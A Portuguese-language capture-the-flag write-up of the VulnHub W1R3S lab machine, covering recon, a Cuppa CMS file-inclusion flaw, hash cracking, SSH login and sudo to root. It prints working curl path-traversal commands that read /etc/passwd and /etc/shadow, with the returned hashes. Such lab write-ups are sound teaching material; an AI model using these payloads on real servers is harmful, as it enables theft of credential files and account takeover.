---
title: Desafio 2 - VM 06
author: R3d-4rr0w
date: 2022-04-14 05:00:00 -0300
categories: [Desafio 2, Beco do Exploit, Writeups]
tags: [Desafio 2, Writeups, Linux, LFI]
image: "/img/desafio2/becoxpl-logo.png"
alt: "Desafio2-VM6"
---

# VM 6 - Wires

---

## [VM 6 - Wires](https://www.vulnhub.com/entry/w1r3s-101,220/)

---

## Reconhecimento

NMAP

```bash
┌──(red_arrow㉿kali)-[~]
└─$ nmap -sV -Pn -v 192.168.56.9
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-11 10:42 EDT
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
3306/tcp open  mysql   MySQL (unauthorized)
Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Procurando no searchsploit, vemos que não tem exploit para o vsftpd.

Vamos abrir a porta 80 no browser.

Ela retorna a página default do Apache.

<img src="/img/desafio2/vm6/wires.png">

Vamos enumerar os diretórios usando o FFUF, que é uma ferramenta para fuzzing.

>**💡[Fuzz Faster U Fool - FFUF](https://github.com/ffuf/ffuf)**


Na enumeração, encontramos o diretório administrator que chama atenção.

<img src="/img/desafio2/vm6/wires 1.png">

E ao acessar via browser, vemos que a aplicação está rodando o Cuppa CMS.

<img src="/img/desafio2/vm6/wires 2.png">

No searchsploit temos um exploit para o Cuppa.

<img src="/img/desafio2/vm6/wires 3.png">

>**💡[Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion](https://www.exploit-db.com/exploits/25971)**


O exploit explora um Local File Inclusion / Remote File Inclusion, que nos permite ler arquivos através do serviço web.

>**💡[What is Local File Inclusion (LFI)?](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/)**


Ao ler o código do exploit, vemos que existe um path para rodar o exploit.

<img src="/img/desafio2/vm6/wires 4.png">

Ao abrir essa URL na aplicação, vemos que a página existe, então vamos continuar com a exploração.

<img src="/img/desafio2/vm6/wires 5.png">

---

## Exploração LFI

No exploit também cita que podemos ler o /etc/passwd usando essa falha, mas ao tenta,  ele não retorna nada e mesmo fazendo o encode para base64 pelo browser, continua não retornando nada.

Então vamos usar o curl, para fazer o encode e a requisição.

Após executar o comando usando o curl, temos acesso ao /etc/passwd do servidor.

```bash
┌──(red_arrow㉿kali)-[~]
└─$ curl -s --data-urlencode urlConfig=../../../../../../../../../../../etc/passwd http://192.168.56.9/administrator/alerts/alertConfigField.php?
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/false
mysql:x:123:130:MySQL Server,,,:/nonexistent:/bin/false
```

Vamos tentar com o /etc/shadow para conseguir os hashs das senhas dos usuários.

```bash
┌──(red_arrow㉿kali)-[~]
└─$ curl -s --data-urlencode urlConfig=../../../../../../../../../../../etc/shadow http://192.168.56.9/administrator/alerts/alertConfigField.php?
root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
daemon:*:17379:0:99999:7:::
bin:*:17379:0:99999:7:::
sys:*:17379:0:99999:7:::
sync:*:17379:0:99999:7:::
games:*:17379:0:99999:7:::
man:*:17379:0:99999:7:::
lp:*:17379:0:99999:7:::
mail:*:17379:0:99999:7:::
news:*:17379:0:99999:7:::
uucp:*:17379:0:99999:7:::
proxy:*:17379:0:99999:7:::
www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
backup:*:17379:0:99999:7:::
list:*:17379:0:99999:7:::
irc:*:17379:0:99999:7:::
gnats:*:17379:0:99999:7:::
nobody:*:17379:0:99999:7:::
systemd-timesync:*:17379:0:99999:7:::
systemd-network:*:17379:0:99999:7:::
systemd-resolve:*:17379:0:99999:7:::
systemd-bus-proxy:*:17379:0:99999:7:::
syslog:*:17379:0:99999:7:::
_apt:*:17379:0:99999:7:::
messagebus:*:17379:0:99999:7:::
uuidd:*:17379:0:99999:7:::
lightdm:*:17379:0:99999:7:::
whoopsie:*:17379:0:99999:7:::
avahi-autoipd:*:17379:0:99999:7:::
avahi:*:17379:0:99999:7:::
dnsmasq:*:17379:0:99999:7:::
colord:*:17379:0:99999:7:::
speech-dispatcher:!:17379:0:99999:7:::
hplip:*:17379:0:99999:7:::
kernoops:*:17379:0:99999:7:::
pulse:*:17379:0:99999:7:::
rtkit:*:17379:0:99999:7:::
saned:*:17379:0:99999:7:::
usbmux:*:17379:0:99999:7:::
w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
sshd:*:17554:0:99999:7:::
ftp:*:17554:0:99999:7:::
mysql:!:17554:0:99999:7:::
```

Agora que temos a hash, vamos usar o john para descobrir a senha.

Conseguimos a senha do user w1r3s

<img src="/img/desafio2/vm6/wires 6.png">

Vamos conectar ao servidor usando o SSH da porta 22.

<img src="/img/desafio2/vm6/wires 7.png">

---

## Escalagem de Privilégio

Ao rodar o sudo -l, vemos que o usuário já tem privilégios de root.

<img src="/img/desafio2/vm6/wires 8.png">

E dentro do diretório root, temos a flag

<img src="/img/desafio2/vm6/wires 9.png">